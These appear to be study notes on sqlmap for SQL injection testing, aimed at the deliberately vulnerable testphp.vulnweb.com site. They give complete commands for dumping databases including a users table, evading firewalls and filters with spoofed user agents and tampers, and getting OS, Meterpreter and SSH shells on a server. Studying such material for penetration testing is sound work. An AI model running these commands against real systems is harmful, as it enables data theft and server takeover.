### Main Syntax
- **-u** : Enter the *URL* of the *Website*
- **--batch** : To *Select* all the *Default Prompts Automatically*
- **--threads** : Number of *Connections to Make*. Default: 1, Max: 10. Use if <u>Website is Large</u>.
- **--data=** : Data string to be sent through *POST* (e.g. "id=1")
- **-p** : Testable parameter(s)

![[Pasted image 20230505093140.png]]

#### Techniques
- B: Boolean-based Blind
- E: Error-based
- U: Union query-based
- S: Stacked Queries
- T: Time-based Blind
- Q: Inline Queries

`--technique "B"`



#### Crawl
**Depth 1:** http://www.example.com/news
**Depth 2:** http://www.example.com/news/newest/
**Depth 3:** http://www.example.com/news/newest/terror/
**Depth 4:** http://www.example.com/news/newest/terror/country/

`--crawl 3`



#### Risk
**1** : Tries *Non-Harmful Payloads*, Won't Affect the Server Much (Default).
**2** : Tries *Time-Based Blind SQLi*, Combines 1 & 2.
**3** : Tries *OR-based SQLi*, Combines 1, 2, 3. Can be **Harmful** if Executes & Might change the Database!

`--risk 3`


#### Level
Increases the **Range** of your SQli Test.
**1** : Checks for *Vulnerable Inputs* (Default)
**2** : Checks for *Vulnerability in the Cookies Section* too!
**3** : Checks for *Vulnerability in the User-Agent Section* too!
.
.
Upto **5**

%%  Note : The Chances of False Positivity increases When using Risk/Level  %%

`--level 1`



#### Verbosity
- **0** : Shows only Python tracebacks, error & critical messages.
- **1** : Shows information & warning messages.
- **2** : Shows debug messages.
- **3** : Shows Tampers injected.
- **4** : Shows also HTTP Requests.
- **5** : Shows also HTTP Response Headers.
- **6** : Shows also HTTP Response Page Content.

`-v 4`

---
# User Enumeration
After you find the vulnerable input field :-
![[Pasted image 20230505103738.png]]

To get **Current User, Current Database, Hostname** :-
```sh
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --current-user --current-db --hostname
```

![[Pasted image 20230505104323.png]]


To get **all** the **Database Names** on the server :-
```sh
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs --batch 
```

![[Pasted image 20230505104814.png]]


To get the **Tables** Inside a Database :-
```sh
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D [database_name] --tables
```

![[Pasted image 20230505105106.png]]


To Get all the **Columns** Inside a Database :-
```sh
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users --columns
```

![[Pasted image 20230505105909.png]]

To Dump **All the Column Entries** inside a Database :-
```sh
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users --dump --batch
```

![[Pasted image 20230505105641.png]]


To Dump all the Tables & Their Entries :-
`sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --dump-all`
%%   Note : Might take time if there are many databases   %%

---
# Output Directory
To Change the Output directory of the Results :-
`sqlmap -u http://testphp.vulnweb.com/ --crawl 3 --output-dir="/root/Documents/" --batch`

---
# Headers

- To Add User-Defined Headers :-
`sqlmap -u http://testphp.vulnweb.com/ --crawl 3 --headers="[header:value]" -v 4 --batch`

![[Pasted image 20230505111222.png]]

- **Cookie**
```sh
sqlmap -u http://testphp.vulnweb.com/ --crawl 3 --cookie="[name]=[value]" -v 4 --batch
```

- **User-Agent**
There might exist a *Firewall which will Analyze Your User-Agent* Header & *Block It* if Not Matching!
To Change your User-Agent Header :-
`sqlmap -u http://testphp.vulnweb.com/ --crawl 3 --user-agent="[User_Agent]" -v 4 --batch`

![[Pasted image 20230505111645.png]]


- **Mobile Request**
To make the Server think that the *Request is Coming* from a *Mobile* :-
```sh
sqlmap -u http://testphp.vulnweb.com/ --crawl 3 --mobile -v 4 --batch
```

![[Pasted image 20230505112351.png]]

---
# Tampers
Used to **Bypass FIlters & Restrictions** of The Server!

- To List all the Tampers :-
`sqlmap --list-tampers`

- To Apply a Tamper in the Command :-
`sqlmap -u http://testphp.vulnweb.com/ --crawl 3 --tamper=[tamper_name] -v 3 --batch`


![[Pasted image 20230505113409.png]]

```sh
# Some Tampers
--random-agent
```


---
### SQLi In Login Page
- To get **All the Forms** Inside a Login Page & Find the **Vulnerable POST Request** :-
`sqlmap -u http://testphp.vulnweb.com/login.php --forms`

![[Pasted image 20230505115412.png]]


- To Run the *SQL Injection*
`sqlmap -u http://testphp.vulnweb.com/userinfo.php --data="uname=abc&pass=abc&login=submit" --dbs`

![[Pasted image 20230505120639.png]]

---
# Sqlmap With Burp Suite
First, we need to Identify the *vulnerable POST request* and save it.![[Pasted image 20230505122529.png]]

Then,
`sqlmap -r <request_file> -p <vulnerable_parameter> --dbs --batch`

---
# Shell
SQL Shell: `sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell`
OS Shell: `sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell`
Meterpreter: `sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn`
SSH Shell: `sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/`
